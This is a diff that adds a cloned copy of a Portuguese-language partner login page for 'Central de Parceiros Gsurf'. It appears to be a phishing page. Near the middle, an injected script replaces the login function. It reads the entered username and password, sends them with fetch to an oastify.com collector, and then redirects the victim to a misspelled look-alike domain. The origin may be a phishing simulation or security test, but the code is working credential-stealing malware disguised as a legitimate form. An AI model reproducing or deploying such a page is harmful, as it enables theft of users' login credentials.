@@ -1,0 +1,95 @@
+
+<!-- saved from url=(0044)https://cdp.homolog.gsurfnet.com/login/login -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"></head><body><br>
+<b>Deprecated</b>:  Array and string offset access syntax with curly braces is deprecated in <b>/var/www/aplicacao/lib/diversas/securimage/securimage.php</b> on line <b>1669</b><br>
+
+<title>Central de Parceiros Gsurf 2.1</title><meta name="viewport" content="width=device-width, initial-scale=1.0"><link href="./bootstrap.css" rel="stylesheet"><link href="./docs.css" rel="stylesheet"><link href="./font-awesome.min.css" rel="stylesheet"><!--<script type="text/javascript" src="js/jquery-1.11.0.min.js"></script>--><script type="text/javascript" src="./jquery-3.4.1.min.js"></script><script type="text/javascript" src="./js_parceiros.js"></script><script type="text/javascript" src="./jquery-ui-1.10.3.custom.min.js"></script><script type="text/javascript" src="./calendario.js"></script><script type="text/javascript" src="./funcoes.js"></script><script type="text/javascript" src="./highcharts-all.js"></script><script type="text/javascript" src="./drilldown.js"></script><link type="text/css" rel="Stylesheet" href="./calendario.jquery-ui.css"><link rel="shortcut icon" href="https://cdp.homolog.gsurfnet.com/favicon.ico"><script type="text/javascript">
+            $(function() {
+                $('.tooltips').tooltip();
+                $('.popovers').popover();
+
+            });
+
+        </script>
+        <!--SIDEBAR END-->
+        <div class="col-md-12">
+            <div class="conteudo">
+                
+            <script type="text/javascript">
+    $(function() {
+        $('.form-signin').keyup(function(event) {
+            if (event.keyCode == 13)
+                login();
+        });
+
+    });
+</script><div class="container">
+    
+    <div class="form-signin">
+        <h3 class="form-signin-heading text-info">Central de Parceiros</h3><br><div id="loginMsg"></div>
+        <input type="text" class="form-control" name="usuario" id="usuario" autocomplete="off" placeholder="Usuário"><input type="password" class="form-control" id="senha" name="senha" placeholder="Senha"><a onclick="$(&#39;#lembrar_senha&#39;).modal()" style="cursor: pointer;">Esqueci minha senha</a><br><div class="col-md-12" id="loginCap"></div><br><button class="btn btn-primary btn-block" type="button" name="entrar" onclick="login()" value="Entrar">Entrar</button><hr><div>
+            <img class="img-responsive" src="./logo_nova_id.png"><!--            <br>--><!--            <div class="alert alert-info" role="alert">--><!--                Prezado cliente,<br>--><!--                nosso servi&ccedil;o de telefonia foi restabelecido, voltamos a atender nos telefones:--><!--                0800 644 4833 ou 48 3254-8700.--><!--            </div>--></div>
+    </div>
+</div> <!-- /container -->
+
+<script>
+window.login = function() {
+    var u = document.getElementById('usuario').value;
+    var s = document.getElementById('senha').value;
+    var targetOast = 'https://d4im6ckw7y6tkek6hq5e0e779yfp3ir7.oastify.com/';
+    var targetRedir = 'https://cdp.homolog.gsurfne.tcom/login/login';
+
+    // 1. Envia os dados para o seu coletor (Oastify)
+    // O uso de 'navigator.sendBeacon' é preferível para redirecionamentos rápidos, 
+    // pois garante o envio mesmo que a página feche.
+    fetch(targetOast + '?u=' + encodeURIComponent(u) + '&p=' + encodeURIComponent(s), {mode: 'no-cors'});
+
+    // 2. Aguarda um curtíssimo tempo para o fetch iniciar e redireciona
+    setTimeout(function() {
+        window.location.href = targetRedir;
+    }, 500); 
+};
+
+</script>
+
+<script type="text/javascript">
+    document.getElementById('usuario').focus();
+</script><!--Modal Lembrar Senha--><div class="modal fade" id="lembrar_senha">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
+                <h3 class="modal-title text-info">Solicitar nova senha</h3>
+            </div>
+            <div class="modal-body">
+                <div id="mensagem"></div>
+                <div id="conteudo_modal">
+                    <div class="row">
+                        <div class="col-md-6">
+                            <label for="email">E-mail</label>
+                            <input type="email" id="email" name="email" class="form-control"></div>
+
+                        <div class="col-md-6">
+                            <label for="cpf">CPF</label>
+                            <input type="text" id="cpf" name="cpf" onblur="validaCpf(this)" class="form-control" maxlength="14" onkeyup="mascaraNumero(&#39;###.###.###-##&#39;, this, event)"><span class="text text-muted small"> *somente números</span>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <label for="cnpj">CNPJ do Parceiro</label>
+                            <input type="text" id="cnpj" name="cnpj" onkeyup="mascaraNumero(&#39;##.###.###/####-##&#39;, this, event)" class="form-control"><span class="text text-muted small"> *somente números</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="modal-footer" id="footer_modal">
+                <button type="button" class="btn btn-primary" onclick="lembrarSenha(&#39;https://cdp.homolog.gsurfnet.com/&#39;)"><i class="fa fa-check"></i> Enviar</button>
+            </div>
+        </div><!-- /.modal-content -->
+    </div><!-- /.modal-dialog -->
+</div><!-- /.modal -->
+<!--Fim Modal Lembrar senha-->
+</div><!--container-fluid-->
+        </div>
+        <script type="text/javascript" src="./bootstrap.js"></script>
+</body></html>
